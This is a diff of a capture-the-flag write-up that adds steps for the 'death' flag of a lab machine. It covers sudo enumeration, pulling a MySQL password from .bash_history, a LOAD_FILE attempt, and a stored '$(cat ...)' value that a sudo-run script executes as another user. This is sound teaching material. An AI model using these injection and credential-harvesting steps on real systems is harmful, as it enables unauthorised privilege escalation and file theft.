@@ -102,7 +102,7 @@ import requests
 
 #Todo add myself as a user
 url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
-password = "HeyLucien#@1999!"
+password = "[REDACTED]"
 
 data = {
         "cont1":password,
@@ -123,6 +123,67 @@ We can now use this password to log in to *lucien* via SSH with
 
 What is the Death Flag?
 -----------------------------------------------------------------------------------------
+From the previous task, we already gained access to the *lucien* user via SSH. Now, we
+want to check for a possible privilege escalation with `sudo -l` and discover that we
+can run the following commands for the *death* user.
+```
+User lucien may run the following commands on ip-<TARGET_MACHINE_IP>:
+    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+```
+Therefore, we can run the `getDreams.py` script for *death* with
+`sudo -u death python3 /home/death/getDreams.py` and get the following database entries
+that are not yet of interest to us.
+
+> Alice + Flying in the sky
+>
+> Bob + Exploring ancient ruins
+>
+> Carol + Becoming a successful entrepreneur
+>
+> Dave + Becoming a professional musician
+
+However, we wonder if there are any hidden secrets in the *lucien* home directory. And,
+indeed in `.bash_history` we can discover the `mysql` password for the user *lucien*.
+We can use this command `mysql -u lucien [REDACTED_PASSWORD]` to log in to the *MySQL*
+instance. In here, we can view all databases with `SHOW DATABASES;` and use one with
+`USE library;`. [^5] In the *library* database, there is the *dreams* table which was
+also displayed in the `getDreams.py` script. Now, we can `DESCRIBE dreams;` to see
+that there is a *dreamer* and *dream* column with the following contents.
+```
+mysql> SELECT * FROM dreams;
++---------+------------------------------------+
+| dreamer | dream                              |
++---------+------------------------------------+
+| Alice   | Flying in the sky                  |
+| Bob     | Exploring ancient ruins            |
+| Carol   | Becoming a successful entrepreneur |
+| Dave    | Becoming a professional musician   |
++---------+------------------------------------+
+```
+It is an idea now, to insert something into the *dream* column (it is longer) that
+reveals the flag to us if it is executed by *death. For this, we look into some ways,
+we can display files via a *MySQL* injection [^6] and try out the `LOAD_FILE` property.
+```mysql
+INSERT INTO dreams (dreamer, dream) VALUES ('flag', LOAD_FILE('/home/death/death_flag.txt'));
+```
+This, however does not yield any result (NULL), and so we simply try a shell bind
+which finally works to display the command.
+```mysql
+INSERT INTO dreams (dreamer, dream) VALUES ('flag', '$(cat /home/death/death_flag.txt)');
+```
+For our *lucien* user we do not have the rights to view the file. But, for the *death*
+user we can now proceed to execute the `getDreams.py` script with
+`sudo -u death python3 /home/death/getDreams.py` once again and get the flag.
+
+> Alice + Flying in the sky
+>
+> Bob + Exploring ancient ruins
+>
+> Carol + Becoming a successful entrepreneur
+>
+> Dave + Becoming a professional musician
+>
+> flag + [RESTRICTED]
 
 What is the Morpheus Flag?
 -----------------------------------------------------------------------------------------
@@ -131,3 +192,5 @@ What is the Morpheus Flag?
 [^2]: https://ubuntu.com/security/notices/USN-7639-1
 [^3]: https://www.exploit-db.com/exploits/49909
 [^4]: https://github.com/pluck-cms/pluck
+[^5]: https://learnsql.com/blog/mysql-cheat-sheet/
+[^6]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-read-content-of-a-file
